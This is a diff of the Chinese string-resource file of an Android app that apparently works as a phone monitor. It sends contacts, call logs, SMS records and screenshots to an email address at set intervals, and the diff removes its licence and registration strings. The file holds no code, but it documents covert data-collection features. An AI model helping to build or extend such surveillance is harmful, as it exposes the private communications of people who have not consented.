@@ -22,23 +22,18 @@
     
     <!-- Mail -->
     <string name="mail_from">来自</string>
-    <string name="mail_body">你好，这是来自{0}的自动发信，附有联系人，电话，短信记录。</string>
+    <string name="mail_body">你好，这是来自 %s 的自动发信，附有联系人，电话，短信记录。</string>
     
     <!-- Preferences -->
     <string name="pref_title">设定</string>
-    <string name="pref_category_reg_key">pref_category_reg</string>
-    <string name="pref_category_reg_title">注册</string>
     <string name="pref_category_feature_key">pref_category_feature</string>
     <string name="pref_category_feature_title">功能</string>
     <string name="pref_category_others_key">pref_category_others</string>
     <string name="pref_category_others_title">其它</string>
     
-    <string name="pref_username_key">pref_username</string>
-    <string name="pref_username_title">用户名</string>
-    <string name="pref_serialnum_key">pref_serialnum</string>
-    <string name="pref_serialnum_title">注册码</string>
     <string name="pref_mail_key">pref_mail</string>
     <string name="pref_mail_title">邮箱</string>
+    <string name="pref_pls_input_mail">邮箱地址 %s 错误，请输入正确的邮箱地址</string>
     <string name="pref_info_interval_key">pref_info_interval</string> 
     <string name="pref_info_interval_title">间隔</string> <!-- days -->
     <string name="pref_info_interval_dlg_title">收集间隔</string>
@@ -52,12 +47,5 @@
     <string name="init_hint_screenshot">获得当前手机截屏并发送至信箱</string>
     <string name="init_hint_setting">设置用户名，注册号，邮箱及监控时间间隔</string>
     <string name="init_hint_hide">退出当前对话框</string>
-    
-    <!-- License -->
-    <string name="licensed_yes">已通过认证，感谢您的使用！</string>
-    <string name="licensed_no">错误的用户名或注册码</string>
-    <string name="pls_input_serial_num">请输入注册码</string>
-    <string name="pls_input_mail">邮箱地址错误，请输入正确的邮箱地址</string>
-    <string name="pls_input_username">请输入用户名</string>
     
 </resources>
